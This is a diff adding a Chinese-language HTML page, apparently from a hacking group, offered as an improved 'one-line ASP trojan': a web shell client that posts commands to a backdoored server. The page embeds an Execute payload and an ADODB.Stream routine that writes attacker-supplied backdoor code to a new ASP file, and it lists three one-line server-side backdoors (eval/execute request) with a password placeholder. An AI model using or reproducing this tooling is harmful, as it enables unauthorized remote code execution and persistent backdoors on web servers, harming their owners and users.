@@ -1,0 +1,68 @@
+<html>
+<head>
+<title>一句话ASP木马完美版--花花修改版</title>
+<style type="text/css">
+<!--
+body {
+        background-color: #ffffff;
+        
+}
+.bad {
+        border: 1px solid #000000;
+        font-size: 12px;
+}
+-->
+</style>
+</head>
+<body bgcolor="#FFFFFF" link="#FFFFFF" vlink="#FFFF00" alink="#FFFFFF">
+<center>
+<div style="width: 350; line-height: 35pt; font-size:16pt; font-family:Comic Sans MS; color: #ffffff; position: relative;
+filter:glow(color=#336699, strength=15)"><b>一句话ASP木马完美版</b></div>
+<table width="627" border="0" align="center" class="bad" height="14" cellspacing="0">
+<tr>
+<td height="1" width="794">
+<form  method="post" name="pass">
+<font color="#000000">服务端网址:</font><input name="act" type="text" id="act" size="84" value="http://"> <input type="submit" value="上传" onClick="this.form.cnnsc.name=this.form.password.value;this.form.action=this.form.act.value;">
+<br>
+登陆密码:<input name="password" type="text" id="password" value="" size="93">
+<input type="hidden" name="cnnsc" id="cnnsc" value="Execute(&quot;Session(&quot;&quot;cnnsc&quot;&quot;)=request(&quot;&quot;*&quot;&quot;):Execute(Session(&quot;&quot;cnnsc&quot;&quot;))&quot;)">
+</td>
+</tr>
+<tr>
+<td height="100" width="794">
+<textarea name="*" cols="100" rows="9" width="45">
+set lP=server.createObject("Adodb.Stream")
+lP.Open
+lP.Type=2
+lP.CharSet="gb2312"
+lP.writetext request("pass")
+lP.SaveToFile server.mappath("Cnnsc.asp"),2
+lP.Close
+set lP=nothing
+response.redirect "Cnnsc.asp"</textarea>
+</td>
+</tr>
+<tr>
+<td height="1" width="794">
+<textarea name="pass" cols="100" rows="15" width="45">
+这里输入您的ASP后门代码</textarea>
+</td>
+</tr>
+<tr>
+<td width="794" height="7">
+
+<font color="#000000">提供三个服务端:</font>
+<br>
+1. &lt;%eval request(&quot;<font color="red">hack88</font>&quot;)%&gt;
+<br>
+2. &lt;%execute request(&quot;<font color="red">hack88</font>&quot;)%&gt;
+<br>
+3. &lt;%execute(request(&quot;<font color="red">hack88</font>&quot;))%&gt;
+<br>
+把红色的<font color="red">hack88</font>换成您的密码,解决了原一句话ASP木马的错误,只要用"<font color="red">eval</font>"替换掉"<font color="red">execute</font>"服务端,就不会出错了!<br>
+www.hack88.cn  花花技术联盟  一句话ASP木马完美版
+</td>
+</tr>
+</table>
+</body>
+</html>
